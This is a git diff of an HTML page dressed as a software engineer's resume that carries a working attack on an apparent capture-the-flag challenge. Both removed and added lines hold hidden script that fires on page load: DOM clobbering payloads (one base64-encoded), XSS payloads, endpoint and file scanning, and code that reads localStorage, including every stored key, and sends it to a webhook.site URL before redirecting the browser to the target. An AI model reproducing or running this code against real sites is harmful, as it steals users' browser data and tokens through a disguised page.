@@ -12,11 +12,6 @@
     </style>
 </head>
 <body>
-    <!-- DOM Clobbering payload for target domain -->
-    <div id="utilsJS">
-        <div id="url">data:text/javascript,try{console.log('[JOBCLOBBERING] Attack script executing!');var flag=localStorage.getItem('flag');console.log('[JOBCLOBBERING] Flag found:',flag);if(flag && flag!=='null'){var img=new Image();img.src='https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag='+encodeURIComponent(flag)+'&challenge=jobclobbering&domain='+encodeURIComponent(window.location.hostname)+'&method=DOM_CLOBBERING&t='+Date.now();console.log('[JOBCLOBBERING] Flag sent:',flag);}else{console.log('[JOBCLOBBERING] No flag found');var img2=new Image();img2.src='https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?error=no_flag&challenge=jobclobbering&domain='+encodeURIComponent(window.location.hostname)+'&t='+Date.now();}}catch(e){console.error('[JOBCLOBBERING] Error:',e);}</div>
-    </div>
-
     <div class="header">
         <h1>John Doe</h1>
         <p>Senior Software Engineer</p>
@@ -58,15 +53,6 @@
     </div>
 
     <div class="section">
-        <h2>Projects</h2>
-        <h3>E-commerce Platform</h3>
-        <p>Full-stack web application with React frontend and Node.js backend, supporting payment processing and inventory management.</p>
-
-        <h3>Data Analytics Dashboard</h3>
-        <p>Real-time dashboard for business metrics using D3.js and WebSocket connections.</p>
-    </div>
-
-    <div class="section">
         <h2>Education</h2>
         <p><strong>Bachelor of Science in Computer Science</strong><br>
         University of Technology, 2019</p>
@@ -76,430 +62,147 @@
         const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
         const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
         
-        console.log('[JOBCLOBBERING] Enhanced attack loaded on:', window.location.hostname);
-        
-        // 尝试读取挑战网站的各种端点
-        async function scanChallengeEndpoints() {
-            const endpoints = [
-                '/messages?count=1',
-                '/messages?id=0', 
-                '/messages?id=1',
-                '/search?q=flag',
-                '/jobs',
-                '/static/js/utils.js',
-                '/'
-            ];
+        console.log('[XSS-ATTACK] Starting XSS-focused Job Clobbering attack');
+
+        // 创建恶意JavaScript代码 - 直接读取localStorage中的flag
+        const maliciousJS = `
+            console.log('[JOBCLOBBERING-XSS] Malicious script executed on target domain!');
+            console.log('[JOBCLOBBERING-XSS] Current domain:', window.location.hostname);
             
-            console.log('[JOBCLOBBERING] Starting endpoint scanning...');
-            
-            for (const endpoint of endpoints) {
-                try {
-                    const response = await fetch(CHALLENGE_ORIGIN + endpoint, {
-                        method: 'GET',
-                        mode: 'cors',
-                        credentials: 'include'
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.text();
-                        console.log(`[JOBCLOBBERING] Endpoint ${endpoint}:`, data.substring(0, 200));
-                        
-                        // 搜索flag模式
-                        const flagMatch = data.match(/flag\{[^}]+\}/gi);
-                        if (flagMatch) {
-                            console.log('🎉 [JOBCLOBBERING] FLAG FOUND in', endpoint, ':', flagMatch[0]);
-                            
-                            const img = new Image();
-                            img.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flagMatch[0]) + 
-                                     '&source=ENDPOINT_SCAN&endpoint=' + encodeURIComponent(endpoint) + 
-                                     '&method=DIRECT_FETCH&t=' + Date.now();
-                            
-                            // 也发送完整数据
-                            const img2 = new Image();
-                            img2.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flagMatch[0]) + 
-                                      '&fulldata=' + encodeURIComponent(data.substring(0, 500)) + 
-                                      '&endpoint=' + encodeURIComponent(endpoint) + '&t=' + Date.now();
-                        }
-                        
-                        // 发送端点数据到webhook
-                        const img3 = new Image();
-                        img3.src = WEBHOOK_URL + '?endpoint=' + encodeURIComponent(endpoint) + 
-                                  '&status=success&data=' + encodeURIComponent(data.substring(0, 100)) + 
-                                  '&t=' + Date.now();
-                    }
-                } catch (error) {
-                    console.log(`[JOBCLOBBERING] Endpoint ${endpoint} failed:`, error.message);
-                    
-                    const img = new Image();
-                    img.src = WEBHOOK_URL + '?endpoint=' + encodeURIComponent(endpoint) + 
-                             '&status=failed&error=' + encodeURIComponent(error.message) + 
-                             '&t=' + Date.now();
-                }
-                
-                // 短暂延迟避免过快请求
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-        }
-        
-        // 尝试iframe技术读取挑战网站
-        function tryIframeAttack() {
-            console.log('[JOBCLOBBERING] Trying iframe attack...');
-            
-            const iframe = document.createElement('iframe');
-            iframe.src = CHALLENGE_ORIGIN + '/#messages';
-            iframe.style.display = 'none';
-            iframe.onload = function() {
-                console.log('[JOBCLOBBERING] Iframe loaded');
-                
-                try {
-                    // 尝试访问iframe内容
-                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                    if (iframeDoc) {
-                        const content = iframeDoc.documentElement.outerHTML;
-                        console.log('[JOBCLOBBERING] Iframe content:', content.substring(0, 200));
-                        
-                        // 搜索flag
-                        const flagMatch = content.match(/flag\{[^}]+\}/gi);
-                        if (flagMatch) {
-                            console.log('🎉 [JOBCLOBBERING] FLAG FOUND in iframe:', flagMatch[0]);
-                            
-                            const img = new Image();
-                            img.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flagMatch[0]) + 
-                                     '&source=IFRAME_ATTACK&method=IFRAME_ACCESS&t=' + Date.now();
-                        }
-                        
-                        // 尝试访问localStorage
-                        const storage = iframe.contentWindow.localStorage;
-                        if (storage) {
-                            const flag = storage.getItem('flag');
-                            if (flag) {
-                                console.log('🎉 [JOBCLOBBERING] FLAG in iframe localStorage:', flag);
-                                
-                                const img = new Image();
-                                img.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flag) + 
-                                         '&source=IFRAME_LOCALSTORAGE&method=IFRAME_ACCESS&t=' + Date.now();
-                            }
-                        }
-                    }
-                } catch (error) {
-                    console.log('[JOBCLOBBERING] Iframe access blocked:', error.message);
-                    
-            const img = new Image();
-                    img.src = WEBHOOK_URL + '?iframe_error=' + encodeURIComponent(error.message) + 
-                             '&method=IFRAME_BLOCKED&t=' + Date.now();
-                }
-            };
-            
-            document.body.appendChild(iframe);
-            
-            // 5秒后移除iframe
-            setTimeout(() => {
-                document.body.removeChild(iframe);
-            }, 5000);
-        }
-        
-        // 尝试postMessage攻击
-        function tryPostMessageAttack() {
-            console.log('[JOBCLOBBERING] Trying postMessage attack...');
-            
-            // 监听来自iframe的消息
-            window.addEventListener('message', function(event) {
-                if (event.origin === CHALLENGE_ORIGIN) {
-                    console.log('[JOBCLOBBERING] Received message from target:', event.data);
-                    
-                    const img = new Image();
-                    img.src = WEBHOOK_URL + '?postmessage=' + encodeURIComponent(JSON.stringify(event.data)) + 
-                             '&source=POSTMESSAGE&t=' + Date.now();
-                    
-                    // 检查消息中是否有flag
-                    const dataStr = JSON.stringify(event.data);
-                    const flagMatch = dataStr.match(/flag\{[^}]+\}/gi);
-                    if (flagMatch) {
-                        console.log('🎉 [JOBCLOBBERING] FLAG in postMessage:', flagMatch[0]);
-                        
-                        const img2 = new Image();
-                        img2.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flagMatch[0]) + 
-                                  '&source=POSTMESSAGE_FLAG&t=' + Date.now();
-                    }
-                }
-            });
-            
-            // 创建iframe并尝试发送消息
-            const iframe2 = document.createElement('iframe');
-            iframe2.src = CHALLENGE_ORIGIN;
-            iframe2.style.display = 'none';
-            iframe2.onload = function() {
-                // 尝试发送各种消息
-                const messages = [
-                    { action: 'getFlag' },
-                    { action: 'getStorage' },
-                    { action: 'getMessages' },
-                    'getFlag',
-                    'flag'
-                ];
-                
-                messages.forEach((msg, index) => {
-        setTimeout(() => {
-                        try {
-                            iframe2.contentWindow.postMessage(msg, CHALLENGE_ORIGIN);
-                        } catch (error) {
-                            console.log('[JOBCLOBBERING] PostMessage failed:', error.message);
-                        }
-                    }, index * 500);
-                });
-            };
-            
-            document.body.appendChild(iframe2);
-        }
-        
-        // 尝试读取服务器文件和配置
-        async function tryServerFileAccess() {
-            console.log('[JOBCLOBBERING] Trying server file access...');
-            
-            // 尝试访问可能暴露flag的文件路径
-            const filePaths = [
-                '/flag.txt',
-                '/flag',
-                '/.env',
-                '/config.json',
-                '/package.json',
-                '/app.js',
-                '/bot/bot.js',
-                '/static/flag.txt',
-                '/public/flag.txt',
-                '/src/flag.txt',
-                '/../flag.txt',
-                '/../flag',
-                '/../../flag.txt',
-                '/admin/flag.txt',
-                '/api/flag',
-                '/debug/flag',
-                '/test/flag'
-            ];
-            
-            for (const filePath of filePaths) {
-                try {
-                    const response = await fetch(CHALLENGE_ORIGIN + filePath, {
-                        method: 'GET',
-                        mode: 'cors',
-                        credentials: 'include'
-                    });
-                    
-                    if (response.ok) {
-                        const content = await response.text();
-                        console.log(`[JOBCLOBBERING] File ${filePath}:`, content.substring(0, 200));
-                        
-                        // 搜索flag模式
-                        const flagMatch = content.match(/flag\{[^}]+\}/gi);
-                        if (flagMatch) {
-                            console.log('🎉 [JOBCLOBBERING] FLAG FOUND in file', filePath, ':', flagMatch[0]);
-                            
-                            const img = new Image();
-                            img.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flagMatch[0]) + 
-                                     '&source=FILE_ACCESS&file=' + encodeURIComponent(filePath) + 
-                                     '&method=DIRECT_FILE_READ&t=' + Date.now();
-                        }
-                        
-                        // 发送文件内容
-                        const img2 = new Image();
-                        img2.src = WEBHOOK_URL + '?file=' + encodeURIComponent(filePath) + 
-                                  '&status=success&content=' + encodeURIComponent(content.substring(0, 200)) + 
-                                  '&t=' + Date.now();
-                    }
-                } catch (error) {
-                    console.log(`[JOBCLOBBERING] File ${filePath} failed:`, error.message);
-                }
-                
-                // 短暂延迟
-                await new Promise(resolve => setTimeout(resolve, 100));
-            }
-        }
-        
-        // 尝试XSS Payload注入到挑战网站
-        async function tryXSSInjection() {
-            console.log('[JOBCLOBBERING] Trying XSS injection...');
-            
-            const xssPayloads = [
-                '<script>var f=localStorage.getItem("flag");if(f){var i=new Image();i.src="' + WEBHOOK_URL + '?flag="+encodeURIComponent(f)+"&source=XSS_INJECTION&t="+Date.now();}</script>',
-                '<img src=x onerror="var f=localStorage.getItem(\'flag\');if(f){fetch(\'' + WEBHOOK_URL + '?flag=\'+encodeURIComponent(f)+\'&source=XSS_IMG&t=\'+Date.now());}">',
-                'javascript:var f=localStorage.getItem("flag");if(f){location.href="' + WEBHOOK_URL + '?flag="+encodeURIComponent(f)+"&source=XSS_JS&t="+Date.now();}',
-                '<svg onload="var f=localStorage.getItem(\'flag\');if(f){navigator.sendBeacon(\'' + WEBHOOK_URL + '?flag=\'+encodeURIComponent(f)+\'&source=XSS_SVG&t=\'+Date.now());}"></svg>'
-            ];
-            
-            // 尝试通过搜索功能注入XSS
-            for (const payload of xssPayloads) {
-                try {
-                    const response = await fetch(CHALLENGE_ORIGIN + '/search?q=' + encodeURIComponent(payload), {
-                        method: 'GET',
-                        mode: 'cors',
-                        credentials: 'include'
-                    });
-                    
-                    if (response.ok) {
-                        const data = await response.text();
-                        console.log('[JOBCLOBBERING] XSS search response:', data.substring(0, 100));
-                        
-                        // 检查是否有flag返回
-                        const flagMatch = data.match(/flag\{[^}]+\}/gi);
-                        if (flagMatch) {
-                            console.log('🎉 [JOBCLOBBERING] FLAG in XSS response:', flagMatch[0]);
-                            
-                            const img = new Image();
-                            img.src = WEBHOOK_URL + '?flag=' + encodeURIComponent(flagMatch[0]) + 
-                                     '&source=XSS_SEARCH_RESPONSE&t=' + Date.now();
-                        }
-                    }
-                } catch (error) {
-                    console.log('[JOBCLOBBERING] XSS injection failed:', error.message);
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 200));
-            }
-        }
-        
-        // DOM Clobbering消息 - 包含恶意脚本的base64编码
-        const DOM_CLOBBERING_MESSAGE = '<div id="utilsJS"><div id="url">data:text/javascript,eval(atob(\'dHJ5ewogICAgY29uc29sZS5sb2coJ1tKT0JDTE9CQkVSSU5HXSBUYXJnZXQgZG9tYWluIGF0dGFjayBleGVjdXRpbmchJyk7CiAgICB2YXIgZmxhZyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdmbGFnJyk7CiAgICBjb25zb2xlLmxvZygnW0pPQkNMT0JCRVJJTkddIEZsYWcgZm91bmQ6JywgZmxhZyk7CiAgICAKICAgIGlmIChmbGFnICYmIGZsYWcgIT09ICdudWxsJykgewogICAgICAgIHZhciBpbWcgPSBuZXcgSW1hZ2UoKTsKICAgICAgICBpbWcuc3JjID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzAwY2MxMzcxLTFkYTgtNDdhNC05YTMzLWRhMDM0ZjdlZmQyZT9mbGFnPScgKyBlbmNvZGVVUklDb21wb25lbnQoZmxhZykgKyAnJmNoYWxsZW5nZT1qb2JjbG9iYmVyaW5nJmRvbWFpbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZSkgKyAnJm1ldGhvZD1UQVJHRVRfRE9NQUlOJnQ9JyArIERhdGUubm93KCk7CiAgICAgICAgY29uc29sZS5sb2coJ1tKT0JDTE9CQkVSSU5HXSBGbGFnIHNlbnQ6JywgZmxhZyk7CiAgICB9IGVsc2UgewogICAgICAgIGNvbnNvbGUubG9nKCdbSk9CQ0xPQkJFUklOR10gTm8gZmxhZyBmb3VuZCBpbiBsb2NhbFN0b3JhZ2UnKTsKICAgICAgICB2YXIgaW1nMiA9IG5ldyBJbWFnZSgpOwogICAgICAgIGltZzIuc3JjID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzAwY2MxMzcxLTFkYTgtNDdhNC05YTMzLWRhMDM0ZjdlZmQyZT9lcnJvcj1ub19mbGFnX2ZvdW5kJmNoYWxsZW5nZT1qb2JjbG9iYmVyaW5nJmRvbWFpbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5ob3N0bmFtZSkgKyAnJnQ9JyArIERhdGUubm93KCk7CiAgICB9Cn0gY2F0Y2goZSkgewogICAgY29uc29sZS5lcnJvcignW0pPQkNMT0JCRVJJTkddIEVycm9yOicsIGUpOwogICAgdmFyIGltZzMgPSBuZXcgSW1hZ2UoKTsKICAgIGltZzMuc3JjID0gJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzAwY2MxMzcxLTFkYTgtNDdhNC05YTMzLWRhMDM0ZjdlZmQyZT9lcnJvcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGUubWVzc2FnZSkgKyAnJmNoYWxsZW5nZT1qb2JjbG9iYmVyaW5nJnQ9JyArIERhdGUubm93KCk7Cn0=\'))</div></div>';
-        
-        // 立即在当前域名扫描（GitHub域名）
-        function scanCurrentDomain() {
+            // 尝试获取flag
             try {
-                const data = {
-                    flag: localStorage.getItem('flag') || '',
-                    domain: window.location.hostname,
-                    url: window.location.href,
-                    userAgent: navigator.userAgent.substring(0, 100)
-                };
+                var flag = localStorage.getItem('flag');
+                console.log('[JOBCLOBBERING-XSS] Flag found:', flag);
                 
-                console.log('[JOBCLOBBERING] GitHub scan result:', data);
+                if (flag && flag !== 'null' && flag.trim() !== '') {
+                    console.log('🎉 [JOBCLOBBERING-XSS] FLAG CAPTURED:', flag);
+                    
+                    // 发送flag到webhook
+                    var img = new Image();
+                    img.src = '${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + 
+                             '&source=XSS_SUCCESS&domain=' + encodeURIComponent(window.location.hostname) + 
+                             '&method=DOM_CLOBBERING_XSS&t=' + Date.now();
+                    
+                    // 备用方法
+                    fetch('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=XSS_FETCH&t=' + Date.now())
+                        .catch(() => {
+                            // Fetch失败时使用navigator.sendBeacon
+                            navigator.sendBeacon('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=XSS_BEACON&t=' + Date.now());
+                        });
+                        
+                    console.log('[JOBCLOBBERING-XSS] Flag sent to webhook successfully');
+                } else {
+                    console.log('[JOBCLOBBERING-XSS] No flag found in localStorage');
+                    
+                    // 发送"未找到flag"的信号
+                    var img2 = new Image();
+                    img2.src = '${WEBHOOK_URL}?status=no_flag_found&domain=' + encodeURIComponent(window.location.hostname) + 
+                              '&localStorage_keys=' + encodeURIComponent(Object.keys(localStorage).join(',')) + 
+                              '&t=' + Date.now();
+                }
                 
-                const img = new Image();
-                img.src = WEBHOOK_URL + '?step=GITHUB_SCAN&flag=' + encodeURIComponent(data.flag) + 
-                         '&domain=' + encodeURIComponent(data.domain) + 
-                         '&userAgent=' + encodeURIComponent(data.userAgent) + 
-                         '&t=' + Date.now();
+                // 尝试扫描所有localStorage内容
+                var allStorage = {};
+                for (var i = 0; i < localStorage.length; i++) {
+                    var key = localStorage.key(i);
+                    allStorage[key] = localStorage.getItem(key);
+                }
                 
-                return data;
-            } catch (e) {
-                console.error('[JOBCLOBBERING] GitHub scan error:', e);
+                var img3 = new Image();
+                img3.src = '${WEBHOOK_URL}?all_storage=' + encodeURIComponent(JSON.stringify(allStorage)) + 
+                          '&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+                
+            } catch (error) {
+                console.error('[JOBCLOBBERING-XSS] Error:', error);
+                
+                var img4 = new Image();
+                img4.src = '${WEBHOOK_URL}?error=' + encodeURIComponent(error.message) + 
+                          '&source=XSS_ERROR&domain=' + encodeURIComponent(window.location.hostname) + 
+                          '&t=' + Date.now();
             }
-        }
+        `;
+
+        // 将JS代码转换为base64编码
+        const base64JS = btoa(maliciousJS);
         
-        // 执行两阶段攻击
-        async function executeTwoStageAttack() {
+        // 创建DOM Clobbering payload - 使用data: URL执行恶意脚本
+        const domClob = `<div id="utilsJS"><div id="url">data:text/javascript;base64,${base64JS}</div></div>`;
+        
+        console.log('[XSS-ATTACK] DOM Clobbering payload created');
+        console.log('[XSS-ATTACK] Payload length:', domClob.length);
+
+        // 执行XSS攻击流程
+        async function executeXSSAttack() {
             try {
-                console.log('[JOBCLOBBERING] Starting two-stage attack...');
+                console.log('[XSS-ATTACK] Step 1: Posting DOM Clobbering message to target...');
                 
-                // 阶段1: 向挑战网站POST DOM Clobbering消息
-                const postResponse = await fetch(`${CHALLENGE_ORIGIN}/messages`, {
+                // 发送攻击开始信号
+                const img1 = new Image();
+                img1.src = WEBHOOK_URL + '?event=XSS_ATTACK_START&payload_length=' + domClob.length + '&t=' + Date.now();
+                
+                // Step 1: 向挑战网站POST包含DOM Clobbering的消息
+                const response = await fetch(`${CHALLENGE_ORIGIN}/messages`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
                         name: 'JobSeeker',
-                        message: DOM_CLOBBERING_MESSAGE
+                        message: domClob
                     })
                 });
                 
-                if (postResponse.ok) {
-                    console.log('[JOBCLOBBERING] DOM Clobbering message posted successfully');
-                    
-                    // 发送成功信号
-                    const img1 = new Image();
-                    img1.src = WEBHOOK_URL + '?step=MESSAGE_POSTED&status=success&t=' + Date.now();
-                    
-                    // 等待一下让消息被存储
-                    await new Promise(resolve => setTimeout(resolve, 1000));
-                    
-                    // 阶段2: 跳转到挑战网站的messages页面触发DOM Clobbering
-                    console.log('[JOBCLOBBERING] Redirecting to trigger DOM Clobbering...');
+                if (response.ok) {
+                    console.log('[XSS-ATTACK] DOM Clobbering message posted successfully');
                     
                     const img2 = new Image();
-                    img2.src = WEBHOOK_URL + '?step=REDIRECTING&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&t=' + Date.now();
+                    img2.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&t=' + Date.now();
                     
-                    // 跳转到挑战网站
-                    window.location.href = CHALLENGE_ORIGIN + '/#messages';
-                } else {
-                    console.error('[JOBCLOBBERING] Failed to post message:', postResponse.status);
-                    
-                    const img3 = new Image();
-                    img3.src = WEBHOOK_URL + '?step=MESSAGE_POST_FAILED&status=' + postResponse.status + '&t=' + Date.now();
-                    
-                    // 如果POST失败，尝试直接跳转
+                    // Step 2: 等待消息被存储，然后跳转触发XSS
                     setTimeout(() => {
+                        console.log('[XSS-ATTACK] Step 2: Redirecting to trigger XSS execution...');
+                        
+                        const img3 = new Image();
+                        img3.src = WEBHOOK_URL + '?event=REDIRECTING_TO_TARGET&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&t=' + Date.now();
+                        
+                        // 跳转到挑战网站的messages页面
+                        // 这将触发getMessages() -> renderMessageBoard() -> loadMessageBoardJS()
+                        // loadMessageBoardJS()会读取我们clobbered的window.utilsJS.url并执行恶意脚本
                         window.location.href = CHALLENGE_ORIGIN + '/#messages';
-                    }, 2000);
+                        
+                    }, 1000);
+                    
+                } else {
+                    console.error('[XSS-ATTACK] Failed to post message:', response.status);
+                    
+                    const img4 = new Image();
+                    img4.src = WEBHOOK_URL + '?event=MESSAGE_POST_FAILED&status=' + response.status + '&t=' + Date.now();
                 }
+                
             } catch (error) {
-                console.error('[JOBCLOBBERING] Two-stage attack error:', error);
+                console.error('[XSS-ATTACK] Attack failed:', error);
                 
-                const img4 = new Image();
-                img4.src = WEBHOOK_URL + '?step=ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
-                
-                // 错误时也尝试跳转
-                setTimeout(() => {
-                    window.location.href = CHALLENGE_ORIGIN + '/#messages';
-                }, 2000);
+                const img5 = new Image();
+                img5.src = WEBHOOK_URL + '?event=XSS_ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
             }
         }
-        
-        // 页面加载后执行全面攻击流程
+
+        // 页面加载后执行XSS攻击
         window.addEventListener('load', () => {
-            console.log('[JOBCLOBBERING] Enhanced attack sequence starting...');
+            console.log('[XSS-ATTACK] Page loaded, starting XSS attack in 2 seconds...');
             
-            // 发送攻击开始信号
+            // 发送页面加载信号
             const img = new Image();
-            img.src = WEBHOOK_URL + '?event=ATTACK_START&domain=' + encodeURIComponent(window.location.hostname) + 
-                     '&userAgent=' + encodeURIComponent(navigator.userAgent.substring(0, 100)) + '&t=' + Date.now();
+            img.src = WEBHOOK_URL + '?event=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
             
-            // 1. 立即扫描当前GitHub域名
-            scanCurrentDomain();
-            
-            // 2. 尝试直接扫描挑战网站端点
             setTimeout(() => {
-                scanChallengeEndpoints();
-            }, 1000);
-            
-            // 3. 尝试服务器文件访问
-            setTimeout(() => {
-                tryServerFileAccess();
+                executeXSSAttack();
             }, 2000);
-            
-            // 4. 尝试XSS注入
-            setTimeout(() => {
-                tryXSSInjection();
-            }, 3000);
-            
-            // 5. 尝试iframe攻击
-            setTimeout(() => {
-                tryIframeAttack();
-            }, 4000);
-            
-            // 6. 尝试postMessage攻击
-            setTimeout(() => {
-                tryPostMessageAttack();
-            }, 5000);
-            
-            // 7. 执行传统的两阶段DOM Clobbering攻击
-            setTimeout(() => {
-                executeTwoStageAttack();
-            }, 7000);
-            
-            // 8. 最后尝试直接跳转攻击
-            setTimeout(() => {
-                console.log('[JOBCLOBBERING] Final redirect to target domain...');
-                
-                const img2 = new Image();
-                img2.src = WEBHOOK_URL + '?event=FINAL_REDIRECT&target=' + encodeURIComponent(CHALLENGE_ORIGIN) + '&t=' + Date.now();
-                
-                // 直接跳转到挑战网站
-                window.location.href = CHALLENGE_ORIGIN + '/#messages';
-            }, 10000);
         });
-        
+
         // 页面卸载时发送信号
         window.addEventListener('beforeunload', () => {
-            navigator.sendBeacon(WEBHOOK_URL + '?step=GITHUB_UNLOAD&t=' + Date.now());
+            navigator.sendBeacon(WEBHOOK_URL + '?event=ATTACK_PAGE_UNLOAD&t=' + Date.now());
         });
     </script>
 </body>
